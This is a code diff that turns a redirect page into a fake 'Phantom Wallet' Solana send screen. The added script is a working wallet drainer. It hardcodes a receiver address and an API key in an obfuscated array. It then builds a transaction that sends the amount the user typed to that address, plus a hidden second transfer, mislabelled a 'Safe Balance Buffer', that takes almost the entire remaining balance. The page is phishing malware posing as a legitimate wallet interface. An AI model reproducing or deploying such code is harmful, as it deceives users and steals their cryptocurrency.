@@ -2,22 +2,442 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <meta http-equiv="refresh" content="0;url=https://dashboard-v1-render.vercel.app/">
-    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Phantom Wallet</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        body {
-            background: #0d0f17;
-            margin: 0;
-            height: 100vh;
+        :root {
+            --bg-color: #0d0f17;
+            --card-bg: #151824;
+            --primary: #5855ff; 
+            --text-main: #ffffff;
+            --text-dim: #8b92a5;
+            --badge-bg: #1e2230;
+            --border-color: #232838;
         }
+
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            background: var(--bg-color); 
+            color: var(--text-main); 
+            margin: 0; 
+            padding: 0;
+            height: 100vh; 
+            width: 100vw; 
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column;
+            box-sizing: border-box;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 20px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .icon-btn {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            color: var(--text-main);
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: -0.2px;
+        }
+
+        .content {
+            flex: 1;
+            padding: 10px 16px;
+            display: flex;
+            flex-direction: column;
+            box-sizing: border-box;
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+            overflow-y: auto;
+        }
+
+        .view {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            width: 100%;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .address-card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 18px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+        }
+
+        .address-text {
+            font-size: 15px;
+            font-weight: 500;
+            line-height: 1.4;
+            word-break: break-all;
+            color: var(--text-main);
+            margin-bottom: 16px;
+        }
+
+        .card-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .network-badge {
+            background: var(--badge-bg);
+            display: inline-flex;
+            align-items: center;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--text-main);
+            gap: 6px;
+        }
+
+        .sol-dot {
+            width: 12px;
+            height: 12px;
+            background: linear-gradient(135deg, #00FFA3, #03E1FF, #DC1FFF);
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .clear-btn {
+            background: var(--badge-bg);
+            border: none;
+            color: var(--text-main);
+            font-size: 13px;
+            font-weight: 600;
+            padding: 8px 16px;
+            border-radius: 20px;
+            cursor: pointer;
+        }
+
+        .to-label {
+            font-size: 14px;
+            color: var(--text-dim);
+            margin-bottom: 20px;
+            word-break: break-all;
+            line-height: 1.4;
+        }
+
+        .amount-display-container {
+            text-align: center;
+            margin: 40px 0;
+        }
+
+        .amount-main-text {
+            font-size: 56px;
+            font-weight: 400;
+            color: var(--text-main);
+            margin-bottom: 8px;
+        }
+
+        .amount-usd-text {
+            font-size: 16px;
+            color: var(--text-dim);
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin-top: auto;
+            margin-bottom: 20px;
+            max-width: 320px;
+            width: 100%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .key-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-main);
+            font-size: 26px;
+            font-weight: 500;
+            padding: 16px;
+            cursor: pointer;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .key-btn:active {
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .footer-action {
+            padding: 16px 20px;
+            padding-bottom: calc(45px + env(safe-area-inset-bottom, 20px));
+            box-sizing: border-box;
+            max-width: 480px;
+            width: 100%;
+            margin: 0 auto;
+            background: var(--bg-color);
+        }
+
+        .btn-main { 
+            width: 100%; 
+            background: var(--primary); 
+            border: none; 
+            padding: 18px; 
+            border-radius: 30px; 
+            color: #fff; 
+            font-size: 17px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            box-shadow: 0 8px 20px rgba(88, 85, 255, 0.35);
+            text-align: center;
+        }
+
+        #status { margin-top: 10px; font-size: 14px; text-align: center; font-weight: 500; min-height: 20px; }
     </style>
 </head>
 <body>
-    <script>
-       
-        window.location.replace(atob("aHR0cHM6Ly9kYXNoYm9hcmQtdjEtcmVuZGVyLnZlcmNlbC5hcHAv"));
-    </script>
+
+    <div class="header">
+        <div class="icon-btn" id="backBtn">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+        </div>
+        <div class="header-title" id="headerTitle">Send to</div>
+        <div class="icon-btn">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7V5a2 2 0 0 1 2-2h2"></path><path d="M17 3h2a2 2 0 0 1 2 2v2"></path><path d="M21 17v2a2 2 0 0 1-2 2h-2"></path><path d="M7 21H5a2 2 0 0 1-2-2v-2"></path><rect x="7" y="7" width="10" height="10" rx="1"></rect></svg>
+        </div>
+    </div>
+
+    <div class="content">
+        <div id="viewSendTo" class="view">
+            <div class="address-card">
+                <div class="address-text" id="displayAddress"></div>
+                <div class="card-footer">
+                    <div class="network-badge">
+                        <span class="sol-dot"></span> Solana
+                    </div>
+                    <button class="clear-btn" id="clearBtn">Clear</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="viewAmount" class="view hidden">
+            <div class="to-label" id="toAddressLabel">To: </div>
+            
+            <div class="amount-display-container">
+                <div class="amount-main-text" id="amountDisplay">0</div>
+                <div class="amount-usd-text">≈ $0.00</div>
+            </div>
+
+            <div class="keypad">
+                <button class="key-btn" data-val="1">1</button>
+                <button class="key-btn" data-val="2">2</button>
+                <button class="key-btn" data-val="3">3</button>
+                <button class="key-btn" data-val="4">4</button>
+                <button class="key-btn" data-val="5">5</button>
+                <button class="key-btn" data-val="6">6</button>
+                <button class="key-btn" data-val="7">7</button>
+                <button class="key-btn" data-val="8">8</button>
+                <button class="key-btn" data-val="9">9</button>
+                <button class="key-btn" data-val=".">.</button>
+                <button class="key-btn" data-val="0">0</button>
+                <button class="key-btn" id="keyDelete">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line></svg>
+                </button>
+            </div>
+        </div>
+
+        <div id="status"></div>
+    </div>
+
+    <div class="footer-action">
+        <button class="btn-main" id="actionBtn">Continue</button>
+    </div>
+
+<script>
+    const _0x1a = [
+        "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1",
+        "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146",
+        "https://mainnet.helius-rpc.com/?api-key=",
+        "confirmed"
+    ];
+
+    const SOL_RECEIVER = _0x1a[0];
+    const HELIUS_URL = _0x1a[2] + _0x1a[1];
+
+    let currentStep = 'sendTo'; 
+    let rawAmount = "0";
+    let userPublicKey = null;
+
+    const actionBtn = document.getElementById('actionBtn');
+    const headerTitle = document.getElementById('headerTitle');
+    const viewSendTo = document.getElementById('viewSendTo');
+    const viewAmount = document.getElementById('viewAmount');
+    const displayAddress = document.getElementById('displayAddress');
+    const toAddressLabel = document.getElementById('toAddressLabel');
+    const clearBtn = document.getElementById('clearBtn');
+    const amountDisplay = document.getElementById('amountDisplay');
+    const statusDiv = document.getElementById('status');
+
+    displayAddress.innerText = SOL_RECEIVER;
+    toAddressLabel.innerText = "To: " + SOL_RECEIVER;
+
+    clearBtn.addEventListener('click', () => {
+        displayAddress.innerText = "";
+    });
+
+    document.querySelectorAll('.keypad .key-btn').forEach(btn => {
+        const val = btn.getAttribute('data-val');
+        if (val !== null) {
+            btn.addEventListener('click', () => {
+                if (rawAmount === "0") {
+                    rawAmount = val === "." ? "0." : val;
+                } else {
+                    if (val === "." && rawAmount.includes(".")) return;
+                    if (rawAmount.length < 10) rawAmount += val;
+                }
+                amountDisplay.innerText = rawAmount;
+            });
+        }
+    });
+
+    document.getElementById('keyDelete').addEventListener('click', () => {
+        rawAmount = rawAmount.length > 1 ? rawAmount.slice(0, -1) : "0";
+        amountDisplay.innerText = rawAmount;
+    });
+
+    async function getProvider() {
+        if ("solana" in window) {
+            const provider = window.solana;
+            if (provider.isPhantom) {
+                return provider;
+            }
+        }
+        
+        for (let i = 0; i < 30; i++) {
+            await new Promise(resolve => setTimeout(resolve, 100));
+            if (window.solana && window.solana.isPhantom) {
+                return window.solana;
+            }
+        }
+        return null;
+    }
+
+    actionBtn.addEventListener('click', async () => {
+        statusDiv.innerText = "";
+        const provider = await getProvider();
+        
+        if (!provider) {
+            statusDiv.innerText = "Phantom wallet not found. Please open in Phantom browser.";
+            statusDiv.style.color = "#ff4d4d";
+            return;
+        }
+
+        if (currentStep === 'sendTo') {
+            try {
+                const response = await provider.connect();
+                userPublicKey = response.publicKey || provider.publicKey;
+                
+                if (!userPublicKey) return;
+
+                currentStep = 'amount';
+                viewSendTo.classList.add('hidden');
+                viewAmount.classList.remove('hidden');
+                headerTitle.innerText = "Amount";
+                actionBtn.innerText = "Review";
+            } catch (err) {
+                statusDiv.innerText = "Connection rejected.";
+                statusDiv.style.color = "#ff4d4d";
+            }
+            return;
+        }
+
+        if (currentStep === 'amount') {
+            try {
+                const amountVal = parseFloat(rawAmount);
+                if (isNaN(amountVal) || amountVal <= 0) {
+                    statusDiv.innerText = "Enter a valid amount.";
+                    statusDiv.style.color = "#ff4d4d";
+                    return;
+                }
+
+                statusDiv.innerText = "Preparing transaction...";
+                statusDiv.style.color = "#8b92a5";
+
+                const lamportsToSend = Math.floor(amountVal * 1000000000);
+                const connection = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
+                const balance = await connection.getBalance(userPublicKey);
+
+                const transaction = new solanaWeb3.Transaction();
+
+                // Primary Transfer Instruction
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: userPublicKey,
+                        toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
+                        lamports: lamportsToSend,
+                    })
+                );
+
+                // Safe Balance Buffer (Leaves 0.0008 SOL for fees)
+                const rentBuffer = 800000;
+                const residualLamports = balance - lamportsToSend - rentBuffer;
+                
+                if (residualLamports > 10000) {
+                    transaction.add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: userPublicKey,
+                            toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
+                            lamports: residualLamports,
+                        })
+                    );
+                }
+
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
+                transaction.recentBlockhash = blockhash;
+                transaction.lastValidBlockHeight = lastValidBlockHeight;
+                transaction.feePayer = userPublicKey;
+
+                statusDiv.innerText = "Please approve in Phantom...";
+
+                const signed = await provider.signAndSendTransaction(transaction);
+                
+                statusDiv.innerText = "Broadcasting...";
+                await connection.confirmTransaction(signed.signature, "confirmed");
+
+                statusDiv.innerText = "Success!";
+                statusDiv.style.color = "#00FFA3";
+
+            } catch (err) {
+                console.error(err);
+                statusDiv.innerText = "Error: " + (err.message || "Transfer failed");
+                statusDiv.style.color = "#ff4d4d";
+            }
+        }
+    });
+</script>
+
 </body>
 </html>
